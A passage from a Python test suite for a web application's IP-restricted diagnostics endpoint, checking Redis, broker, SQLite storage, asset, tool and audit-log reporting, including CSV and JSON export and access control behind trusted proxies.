        cap = shell_assets._DIAG_REDIS_SCAN_KEY_CAP
        # Return cap+1 fake runstream keys so the bounded scan trips the capped flag.
        many_streams = [f"runstream:r{i}" for i in range(cap + 5)]
        fake = self._fake_redis_client(
            scan_keys={
                "runstream:*":    many_streams,
                "proc:*":         [],
                "procmeta:*":     [],
                "sessionprocs:*": [],
            },
        )
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                data = json.loads(client.get("/diag?format=json").data)
        runstream_ns = next(ns for ns in data["redis"]["stats"]["namespaces"]
                            if ns["name"] == "runstream")
        assert runstream_ns["capped"] is True
        assert runstream_ns["count"] == cap

    def test_broker_section_reports_in_process_mode_when_redis_unconfigured(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", None):
                data = json.loads(client.get("/diag?format=json").data)
        broker = data["broker"]
        assert broker["mode"] == "in_process"
        assert "fallback" in broker
        for key in ("streams", "active", "closed", "expired_pending_purge",
                    "events", "bytes", "pid_count", "active_run_count",
                    "session_count"):
            assert key in broker["fallback"], f"missing fallback key: {key}"

    def test_broker_section_omits_fallback_when_redis_configured(self):
        client = self._allowed_client()
        fake = self._fake_redis_client()
        # `broker_mode()` reads from run_broker's own module-level reference,
        # so patch both the assets-blueprint binding and the broker module.
        import services.runs.broker as shell_broker
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                with mock.patch.object(shell_broker, "redis_client", fake):
                    data = json.loads(client.get("/diag?format=json").data)
        broker = data["broker"]
        assert broker["mode"] == "redis"
        assert "fallback" not in broker

    def test_broker_section_reports_unavailable_when_disabled(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "run_broker_enabled": False,
        }):
            data = json.loads(client.get("/diag?format=json").data)
        broker = data["broker"]
        assert broker["available"] is False
        assert "disabled" in broker["unavailable_reason"].lower()

    def test_broker_fallback_snapshot_reflects_published_events(self):
        client = self._allowed_client()
        # Publish two events to the in-memory store so the snapshot is non-empty.
        # Use a dedicated module import to avoid leaking state across tests.
        import services.runs.broker as shell_broker
        run_id = f"diag-test-{uuid.uuid4().hex}"
        try:
            shell_broker._memory_store.publish(run_id, "stdout", {"line": "hi"})
            shell_broker._memory_store.publish(run_id, "stdout", {"line": "again"})
            with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
                with mock.patch.object(shell_assets, "redis_client", None):
                    data = json.loads(client.get("/diag?format=json").data)
            fb = data["broker"]["fallback"]
            assert fb["streams"] >= 1
            assert fb["events"] >= 2
            assert fb["active"] >= 1
            assert fb["bytes"] > 0
        finally:
            # Trip the snapshot's purge: drop the test run from the in-memory
            # store so we don't leak state into later tests.
            with shell_broker._memory_store._lock:
                shell_broker._memory_store._events.pop(run_id, None)
                shell_broker._memory_store._bytes.pop(run_id, None)
                shell_broker._memory_store._closed.discard(run_id)
                shell_broker._memory_store._expires_at.pop(run_id, None)

    def test_db_section_reports_file_size_and_human(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        db = data["db"]
        assert isinstance(db["size"], int) and db["size"] > 0
        assert db["size_human"]
        assert any(db["size_human"].endswith(unit) for unit in (" B", " KB", " MB", " GB"))
        # WAL size key is always populated (zero if no -wal sidecar exists)
        assert isinstance(db["wal_size"], int)
        assert db["wal_size_human"]

    def test_db_section_reports_journal_mode(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        # SQLite returns one of: delete, truncate, persist, memory, wal, off.
        assert data["db"]["journal_mode"] in {
            "delete", "truncate", "persist", "memory", "wal", "off",
        }

    def test_db_section_reports_freelist_and_reclaimable_bytes(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        db = data["db"]
        assert isinstance(db["page_count"], int) and db["page_count"] > 0
        assert isinstance(db["page_size"], int) and db["page_size"] > 0
        assert isinstance(db["freelist_count"], int) and db["freelist_count"] >= 0
        assert db["reclaimable_size"] == db["freelist_count"] * db["page_size"]
        assert db["reclaimable_size_human"]

    def test_db_section_reports_per_table_row_counts(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        tables = data["db"]["tables"]
        assert isinstance(tables, list) and tables
        names = {t["name"] for t in tables}
        # Core schema tables are present and FTS5 shadow tables are not.
        assert "runs" in names
        assert not any(name.startswith("sqlite_") for name in names)
        assert not any(name.startswith("runs_fts_") for name in names), (
            f"FTS5 shadow tables leaked into the table list: {names}"
        )
        for entry in tables:
            assert isinstance(entry["name"], str) and entry["name"]
            assert isinstance(entry["rows"], int) and entry["rows"] >= 0

    def test_db_storage_breakdown_reports_buckets(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        storage = data["db"]["storage"]
        assert isinstance(storage["dbstat_available"], bool)
        assert storage["buckets"]
        bucket_names = {bucket["name"] for bucket in storage["buckets"]}
        assert "Runs and transcripts" in bucket_names
        run_bucket = next(bucket for bucket in storage["buckets"] if bucket["name"] == "Runs and transcripts")
        run_entry = next(row for row in run_bucket["rows"] if row["name"] == "runs")
        assert isinstance(run_entry["rows"], int)
        assert isinstance(run_entry["logical_payload"], int)
        assert run_entry["logical_payload_human"]

    def test_db_storage_breakdown_sums_payload_and_artifact_bytes(self, tmp_path):
        db_path = tmp_path / "diag_storage_payload.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output TEXT, "
                "output_preview TEXT, output_search_text TEXT)"
            )
            conn.execute(
                "CREATE TABLE run_output_artifacts ("
                "run_id TEXT PRIMARY KEY, rel_path TEXT NOT NULL, compression TEXT NOT NULL, byte_size INTEGER NOT NULL)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
                "VALUES (?, ?, ?, ?, ?)",
                ("run-a", "dig darklab.sh", "abc", "de", "fghi"),
            )
            conn.execute(
                "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size) "
                "VALUES (?, ?, ?, ?)",
                ("run-a", "out.gz", "gzip", 128),
            )
            conn.commit()
            storage = shell_assets._diag_table_storage_breakdown(conn, {
                "runs": 1,
                "run_output_artifacts": 1,
            })

        run_entry = next(
            row for bucket in storage["buckets"] for row in bucket["rows"]
            if row["name"] == "runs"
        )
        artifact_entry = next(
            row for bucket in storage["buckets"] for row in bucket["rows"]
            if row["name"] == "run_output_artifacts"
        )
        assert run_entry["logical_payload"] == len("dig darklab.sh") + len("abc") + len("de") + len("fghi")
        assert artifact_entry["logical_payload"] == len("out.gz") + len("gzip") + 128
        assert storage["largest_runs"][0]["id"] == "run-a"

        without_output_path = tmp_path / "diag_storage_payload_without_output.db"
        with sqlite3.connect(without_output_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output_preview TEXT, output_search_text TEXT)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output_preview, output_search_text) "
                "VALUES (?, ?, ?, ?)",
                ("run-b", "host darklab.sh", "preview", "search"),
            )
            conn.commit()
            storage_without_output = shell_assets._diag_table_storage_breakdown(conn, {"runs": 1})

        assert storage_without_output["largest_runs"][0]["id"] == "run-b"
        assert storage_without_output["largest_runs"][0]["payload"] == len("preview") + len("search")
        assert not any("largest runs probe failed" in error for error in storage_without_output["errors"])

    def test_db_storage_breakdown_rolls_up_fts_shadow_tables(self, tmp_path):
        db_path = tmp_path / "diag_storage_fts.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output TEXT, "
                "output_preview TEXT, output_search_text TEXT)"
            )
            conn.execute(
                "CREATE VIRTUAL TABLE runs_fts USING fts5("
                "command, output_search_text, content=runs, content_rowid=rowid)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
                "VALUES (?, ?, ?, ?, ?)",
                ("run-fts", "host darklab.sh", "", "", "104.21.4.35"),
            )
            rowid = conn.execute("SELECT rowid FROM runs WHERE id = ?", ("run-fts",)).fetchone()[0]
            conn.execute(
                "INSERT INTO runs_fts(rowid, command, output_search_text) VALUES (?, ?, ?)",
                (rowid, "host darklab.sh", "104.21.4.35"),
            )
            conn.commit()
            storage = shell_assets._diag_table_storage_breakdown(conn, {"runs": 1, "runs_fts": 1})

        if not storage["dbstat_available"]:
            pytest.skip("SQLite dbstat virtual table is unavailable")
        fts_entry = next(
            row for bucket in storage["buckets"] for row in bucket["rows"]
            if row["name"] == "runs_fts"
        )
        assert fts_entry["kind"] == "virtual-table"
        assert {shadow["name"] for shadow in fts_entry["shadows"]} >= {
            "runs_fts_data",
            "runs_fts_idx",
        }

    def test_db_storage_breakdown_falls_back_without_dbstat(self, tmp_path):
        class _FakeCursor:
            def __init__(self, rows):
                self._rows = rows

            def fetchone(self):
                return self._rows[0] if self._rows else None

        class _NoDbstatConn:
            def __init__(self, conn):
                self._conn = conn

            def execute(self, sql, params=()):
                if "sqlite_compileoption_used('ENABLE_DBSTAT_VTAB')" in sql:
                    return _FakeCursor([(0,)])
                assert "FROM dbstat" not in sql
                return self._conn.execute(sql, params)

        db_path = tmp_path / "diag_storage_no_dbstat.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, output TEXT, "
                "output_preview TEXT, output_search_text TEXT)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output, output_preview, output_search_text) "
                "VALUES (?, ?, ?, ?, ?)",
                ("run-no-dbstat", "whois darklab.sh", "abc", "", "abc"),
            )
            conn.commit()
            storage = shell_assets._diag_table_storage_breakdown(_NoDbstatConn(conn), {"runs": 1})

        run_entry = next(
            row for bucket in storage["buckets"] for row in bucket["rows"]
            if row["name"] == "runs"
        )
        assert storage["dbstat_available"] is False
        assert run_entry["allocated_human"] == "—"
        assert run_entry["logical_payload"] == len("whois darklab.sh") + len("abc") + len("abc")

    def test_html_response_renders_storage_breakdown_section(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        assert "Storage breakdown" in body
        assert "Runs and transcripts" in body
        assert "Largest saved runs" in body or "Largest saved runs skipped" in body

    def test_db_section_quotes_metadata_table_names_for_row_counts(self, tmp_path):
        db_path = tmp_path / "diag_tables.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute('CREATE TABLE "odd""table" (id INTEGER PRIMARY KEY)')
            conn.execute('INSERT INTO "odd""table" DEFAULT VALUES')
            conn.execute('INSERT INTO "odd""table" DEFAULT VALUES')
            conn.commit()

        def connect_tmp_db():
            return sqlite3.connect(db_path)

        with mock.patch.object(shell_assets, "DB_PATH", str(db_path)), \
             mock.patch.object(shell_assets, "db_connect", connect_tmp_db):
            info = shell_assets._diag_db_stats()

        assert {"name": 'odd"table', "rows": 2} in info["tables"]

    def test_diag_sqlite_identifier_rejects_empty_or_nul_names(self):
        assert quote_sqlite_identifier('odd"table') == '"odd""table"'
        with pytest.raises(ValueError):
            quote_sqlite_identifier("")
        with pytest.raises(ValueError):
            quote_sqlite_identifier("bad\x00name")

    def test_db_section_runs_and_snapshots_remain_at_top_level(self):
        """Backward-compat for the original /diag schema — `runs` and
        `snapshots` are still surfaced at db.* even though they are also
        listed inside `tables`."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert isinstance(data["db"]["runs"], int)
        assert isinstance(data["db"]["snapshots"], int)
        # Match the per-table row count.
        runs_in_table = next(
            (t["rows"] for t in data["db"]["tables"] if t["name"] == "runs"), None
        )
        assert data["db"]["runs"] == runs_in_table

    def test_db_section_reports_fts_orphan_count(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert isinstance(data["db"]["fts_orphans"], int)
        assert data["db"]["fts_orphans"] >= 0

    def test_db_fts_orphan_probe_uses_sqlite_rowid_not_uuid_id(self, tmp_path):
        db_path = tmp_path / "diag_fts.db"
        with sqlite3.connect(db_path) as conn:
            conn.execute(
                "CREATE TABLE runs ("
                "id TEXT PRIMARY KEY, command TEXT NOT NULL, "
                "output_search_text TEXT)"
            )
            conn.execute(
                "CREATE VIRTUAL TABLE runs_fts USING fts5("
                "command, output_search_text, content=runs, content_rowid=rowid)"
            )
            conn.execute(
                "INSERT INTO runs (id, command, output_search_text) VALUES (?, ?, ?)",
                ("run-uuid-1", "ping darklab.sh", "ok"),
            )
            rowid = conn.execute(
                "SELECT rowid FROM runs WHERE id = ?",
                ("run-uuid-1",),
            ).fetchone()[0]
            conn.execute(
                "INSERT INTO runs_fts(rowid, command, output_search_text) "
                "VALUES (?, ?, ?)",
                (rowid, "ping darklab.sh", "ok"),
            )
            conn.commit()

        def connect_tmp_db():
            return sqlite3.connect(db_path)

        with mock.patch.object(shell_assets, "DB_PATH", str(db_path)), \
             mock.patch.object(shell_assets, "db_connect", connect_tmp_db):
            info = shell_assets._diag_db_stats()

        assert info["runs"] == 1
        assert info["fts_orphans"] == 0

    def test_db_section_reports_ping_and_probe_timings(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag?format=json")
            data = json.loads(resp.data)
        assert data["db"]["ok"] is True
        assert isinstance(data["db"]["ping_ms"], (int, float))
        assert data["db"]["ping_ms"] >= 0
        assert isinstance(data["db"]["probe_ms"], (int, float))
        assert data["db"]["probe_ms"] >= data["db"]["ping_ms"]
        assert isinstance(data["db"]["query_ms"], (int, float))
        assert data["db"]["query_ms"] == data["db"]["probe_ms"]
        assert data["db"]["ping_human"]
        assert data["db"]["probe_human"]

        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        assert "ping " in body
        assert "diag probe " in body

    def test_assets_section_reports_loaded_when_files_present(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        for label in ("ansi_up", "jspdf", "fonts"):
            entry = data["assets"][label]
            assert entry["ok"] is True, f"{label} probe should be ok: {entry!r}"
            assert entry["status"] == 200
            assert entry["size"] > 0, f"{label} HEAD reported zero bytes"
            assert entry["size_human"]

    def test_assets_section_reports_missing_when_files_absent(self, tmp_path, monkeypatch):
        client = self._allowed_client()
        monkeypatch.setattr(shell_assets, "_ANSI_UP_JS", tmp_path / "missing_ansi_up.js")
        monkeypatch.setattr(shell_assets, "_JSPDF_JS", tmp_path / "missing_jspdf.js")
        monkeypatch.setattr(shell_assets, "_FONT_DIR", tmp_path / "missing_fonts")
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        for label in ("ansi_up", "jspdf", "fonts"):
            entry = data["assets"][label]
            assert entry["ok"] is False, f"{label} probe should fail: {entry!r}"
            assert entry["status"] == 404

    def test_assets_probe_size_matches_served_content_length(self):
        """The HEAD probe surfaces the actual served Content-Length, so
        a zero-byte or partial file is visible without shelling in."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        # The size reported by the probe matches a direct GET against the URL.
        for label in ("ansi_up", "jspdf"):
            entry = data["assets"][label]
            direct = client.get(entry["url"])
            assert direct.status_code == 200
            served_size = int(direct.headers.get("Content-Length") or len(direct.data))
            assert entry["size"] == served_size, (
                f"{label} probe size {entry['size']} != served size {served_size}"
            )

    def test_assets_probe_reports_size_human_in_short_form(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        for label in ("ansi_up", "jspdf", "fonts"):
            human = data["assets"][label]["size_human"]
            assert human, f"{label} probe missing size_human"
            assert any(human.endswith(unit) for unit in (" B", " KB", " MB", " GB")), (
                f"unexpected size_human format: {human!r}"
            )

    def test_diag_fmt_bytes_buckets(self):
        f = shell_assets._diag_fmt_bytes
        assert f(0) == "0 B"
        assert f(512) == "512 B"
        assert f(1024) == "1.0 KB"
        assert f(1536) == "1.5 KB"
        assert f(1024 * 1024) == "1.0 MB"
        assert f(1024 * 1024 * 1024) == "1.0 GB"

    def test_tools_section_has_present_and_missing_lists(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert isinstance(data["tools"]["present"], list)
        assert isinstance(data["tools"]["missing"], list)

    def test_tools_present_contains_known_binary(self):
        """curl is allowed and installed in the dev environment."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        # At minimum, basic tools available in dev should appear in present
        present = data["tools"]["present"]
        assert isinstance(present, list)
        # Every entry in present is a dict with a name that resolves via which()
        import shutil as _shutil
        for entry in present:
            assert isinstance(entry, dict), f"present entry is not a dict: {entry!r}"
            assert _shutil.which(entry["name"]) is not None, (
                f"{entry['name']} in present but not found by which()"
            )

    def test_tools_present_entries_carry_name_and_path_only(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        present = data["tools"]["present"]
        if not present:
            pytest.skip("dev environment has no allowlisted binaries on PATH")
        for entry in present:
            assert set(entry.keys()) == {"name", "path"}
            assert isinstance(entry["name"], str) and entry["name"]
            assert isinstance(entry["path"], str) and entry["path"].startswith("/")

    def test_tools_probe_does_not_read_binary_mtime(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
                with mock.patch(
                    "blueprints.assets.os.path.getmtime",
                    side_effect=AssertionError("tool mtime should not be probed"),
                ):
                    data = json.loads(client.get("/diag?format=json").data)
        present = data["tools"]["present"]
        assert present, "expected synthetic which() to populate the present list"
        assert all(set(entry.keys()) == {"name", "path"} for entry in present)

    def test_tools_html_omits_stale_counts_and_age_suffixes(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
                body = client.get("/diag").get_data(as_text=True)
        assert "diag-chip-age" not in body
        assert " stale)" not in body
        assert 'class="diag-chip present stale"' not in body

    def test_diag_tool_entry_returns_name_and_path_only(self):
        with mock.patch("blueprints.assets.shutil.which", return_value="/fake/bin/tool"):
            assert shell_assets._diag_tool_entry("curl") == {
                "name": "curl",
                "path": "/fake/bin/tool",
            }

    def test_honors_forwarded_for_header_from_trusted_proxy(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
            "trusted_proxy_cidrs": ["127.0.0.1/32"],
        }):
            resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
        assert resp.status_code == 200

    def test_ignores_forwarded_for_header_from_untrusted_proxy(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
            "trusted_proxy_cidrs": ["192.0.2.0/24"],
        }):
            resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
        assert resp.status_code == 404

    def test_diag_viewed_logged_on_success(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(logging.getLogger("shell"), "info") as mock_info:
                resp = client.get("/diag")
        assert resp.status_code == 200
        events = [call[0][0] for call in mock_info.call_args_list]
        assert "DIAG_VIEWED" in events
        viewed_call = next(c for c in mock_info.call_args_list if c[0][0] == "DIAG_VIEWED")
        assert viewed_call[1]["extra"]["ip"] == "127.0.0.1"

    def test_audit_route_requires_diag_access(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            resp = client.get("/diag/audit")
        assert resp.status_code == 404

    def test_audit_html_lists_events_and_disabled_banner(self):
        team_id = f"team_diag_html_{uuid.uuid4().hex}"
        target_id = self._record_audit_event(team_id=team_id)
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "audit_log_enabled": False,
        }):
            resp = client.get(f"/diag/audit?target_id={target_id}")
        body = resp.get_data(as_text=True)
        assert resp.status_code == 200
        assert "Audit logging is disabled" in body
        assert "project.link" in body
        assert target_id in body
        assert f'href="/projects/{target_id}"' not in body
        assert "Diag Operator" in body
        assert '<form class="diag-audit-filter-form" method="get" action="/diag/audit">' in body
        assert '<div class="diag-audit-table-wrap">' in body
        assert '<table class="diag-table diag-audit-table">' in body
        assert '<col class="diag-audit-col-target">' in body
        assert '<col class="diag-audit-col-scope">' in body
        assert '<td class="diag-audit-target">' in body
        assert '<td class="diag-audit-scope">' in body
        assert f'<span class="diag-muted diag-audit-team-id" title="{team_id}">· {team_id}</span>' in body
        assert '<details class="diag-audit-details">' in body
        assert '<summary>details</summary>' in body
        assert '<pre>{' in body
        assert "entity.delete - entity deletion" in body
        assert "entity.suppress - entity suppression" in body
        assert "history.delete - run deletion" in body
        assert "project.link - project link" in body
        assert "&#34;actor&#34;" in body
        assert "&#34;scope&#34;" in body
        assert "&#34;target&#34;" in body
        assert "&#34;created&#34;" in body
        assert "&#34;details&#34;" in body

    def test_audit_json_filters_by_human_actor_and_event(self):
        actor_member_id = f"tmem_diag_actor_filter_{uuid.uuid4().hex}"
        actor_display_name = f"Filter Person {uuid.uuid4().hex}"
        team_id = f"team_diag_date_filter_{uuid.uuid4().hex}"
        wanted_target = self._record_audit_event(
            event_type="project.link",
            actor_member_id=actor_member_id,
            actor_display_name=actor_display_name,
            team_id=team_id,
            created="2026-06-06T12:00:01+00:00",
        )
        self._record_audit_event(
            event_type="project.link",
            actor_member_id=actor_member_id,
            actor_display_name=actor_display_name,
            team_id=f"team_diag_other_{uuid.uuid4().hex}",
            created="2026-06-06T12:00:02+00:00",
        )
        self._record_audit_event(
            event_type="project.link",
            actor_member_id=actor_member_id,
            actor_display_name=actor_display_name,
            team_id=team_id,
            created="2026-06-07T00:00:00+00:00",
        )
        client = self._allowed_client()
        actor_display_fragment = actor_display_name[-12:].lower()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets.log, "info") as log_info:
                resp = client.get(
                    "/diag/audit?format=json&event_type=project.link&session_id=diag-audit-owner"
                    f"&team_id={quote(team_id)}&target_type=project&date_from=2026-06-06&date_to=2026-06-06"
                    "&actor=" + quote(actor_display_fragment)
                )
        payload = resp.get_json()
        assert resp.status_code == 200
        assert [event["target_id"] for event in payload["events"]] == [wanted_target]
        viewed_call = next(call for call in log_info.call_args_list if call.args[0] == "DIAG_AUDIT_VIEWED")
        viewed_extra = viewed_call.kwargs["extra"]
        assert viewed_extra["ip"] == "127.0.0.1"
        assert viewed_extra["limit"] == 50
        assert viewed_extra["offset"] == 0
        assert viewed_extra["event_count"] == 1
        assert viewed_extra["has_more"] is False
        assert viewed_extra["filter_count"] == 7
        assert viewed_extra["filter_keys"] == [
            "actor",
            "date_from",
            "date_to",
            "event_type",
            "session_id",
            "target_type",
            "team_id",
        ]
        assert viewed_extra["filter_values"] == {
            "date_from": "2026-06-06",
            "date_to": "2026-06-06",
            "event_type": "project.link",
            "target_type": "project",
            "team_id": team_id,
        }
        assert "diag-audit-owner" not in json.dumps(viewed_extra)
        assert actor_display_fragment not in json.dumps(viewed_extra)
        assert payload["events"][0]["target_href"] == ""
        assert payload["events"][0]["project_href"] == ""
        assert payload["events"][0]["details"]["source"] == "test"
        details_payload = json.loads(payload["events"][0]["details_json"])
        assert details_payload["created"] == "2026-06-06T12:00:01+00:00"
        assert details_payload["event_type"] == "project.link"
        assert details_payload["actor"]["display_name"] == actor_display_name
        assert details_payload["actor"]["member_id"] == actor_member_id
        assert details_payload["scope"]["kind"] == "team"
        assert details_payload["scope"]["team_id"] == team_id
        assert details_payload["target"]["id"] == wanted_target
        assert details_payload["target"]["href"] == ""
        assert details_payload["details"]["source"] == "test"

        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            member_resp = client.get(
                "/diag/audit?format=json&event_type=project.link"
                f"&team_id={quote(team_id)}&target_type=project&date_from=2026-06-06&date_to=2026-06-06"
                "&actor=" + quote(actor_member_id[-12:])
            )
        member_payload = member_resp.get_json()
        assert member_resp.status_code == 200
        assert [event["target_id"] for event in member_payload["events"]] == [wanted_target]

    def test_audit_json_keeps_run_permalink_target_links(self):
        run_id = f"run_diag_audit_{uuid.uuid4().hex}"
        self._record_audit_event(
            event_type="history.delete",
            target_type="run",
            target_id=run_id,
        )
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get(f"/diag/audit?format=json&target_id={run_id}")
        payload = resp.get_json()
        assert resp.status_code == 200
        assert [event["target_id"] for event in payload["events"]] == [run_id]
        assert payload["events"][0]["target_href"] == f"/history/{run_id}"
        assert payload["events"][0]["project_href"] == ""

    def test_audit_csv_export_marks_truncation(self):
        correlation_id = f"corr-diag-audit-{uuid.uuid4().hex}"
        first_target = self._record_audit_event(
            target_id=f"proj-diag-audit-first-{uuid.uuid4().hex}",
            correlation_id=correlation_id,
            created="2026-06-06T12:00:03+00:00",
        )
        self._record_audit_event(
            target_id=f"proj-diag-audit-second-{uuid.uuid4().hex}",
            correlation_id=correlation_id,
            created="2026-06-06T12:00:04+00:00",
        )
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "audit_export_max_rows": 1,
        }):
            resp = client.get(f"/diag/audit/export?correlation_id={correlation_id}")
        body = resp.get_data(as_text=True)
        assert resp.status_code == 200
        assert "text/csv" in resp.content_type
        assert first_target in body or "proj-diag-audit-second-" in body
        assert "__truncated__" in body
        assert "Export capped at 1 rows" in body

    def test_audit_csv_export_streams_from_page_iterator(self):
        page_calls = []

        def fake_iter_event_pages(filters, *, max_rows):
            page_calls.append((filters, max_rows))
            yield {
                "events": [{
                    "id": "aud-page-1",
                    "created": "2026-06-06T12:00:04+00:00",
                    "event_type": "project.link",
                    "target_type": "project",
                    "target_id": "proj-stream-1",
                    "details": {"source": "test"},
                }],
                "truncated": False,
            }
            yield {
                "events": [{
                    "id": "aud-page-2",
                    "created": "2026-06-06T12:00:03+00:00",
                    "event_type": "project.delete",
                    "target_type": "project",
                    "target_id": "proj-stream-2",
                    "details": {"source": "test"},
                }],
                "truncated": True,
            }

        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "audit_export_max_rows": 2,
        }), mock.patch("blueprints.assets.iter_event_pages", side_effect=fake_iter_event_pages), mock.patch.object(
            shell_assets.log,
            "info",
        ) as log_info:
            resp = client.get("/diag/audit/export?event_type=project.link")
            body = resp.get_data(as_text=True)
        assert resp.status_code == 200
        assert len(page_calls) == 1
        assert page_calls[0][0].event_type == "project.link"
        assert page_calls[0][1] == 2
        assert "aud-page-1" in body
        assert "aud-page-2" in body
        assert "__truncated__" in body
        exported_call = next(call for call in log_info.call_args_list if call.args[0] == "DIAG_AUDIT_EXPORTED")
        exported_extra = exported_call.kwargs["extra"]
        assert exported_extra["ip"] == "127.0.0.1"
        assert exported_extra["format"] == "csv"
        assert exported_extra["limit"] == 2
        assert exported_extra["event_count"] == 2
        assert exported_extra["truncated"] is True
        assert exported_extra["filter_count"] == 1
        assert exported_extra["filter_keys"] == ["event_type"]
        assert exported_extra["filter_values"] == {"event_type": "project.link"}

    def test_audit_json_export_prompts_download(self):
        correlation_id = f"corr-diag-audit-json-{uuid.uuid4().hex}"
        self._record_audit_event(
            target_id=f"proj-diag-audit-json-first-{uuid.uuid4().hex}",
            correlation_id=correlation_id,
            created="2026-06-06T12:00:03+00:00",
        )
        newest_target_id = self._record_audit_event(
            target_id=f"proj-diag-audit-json-second-{uuid.uuid4().hex}",
            correlation_id=correlation_id,
            created="2026-06-06T12:00:04+00:00",
        )
        client = self._allowed_client()
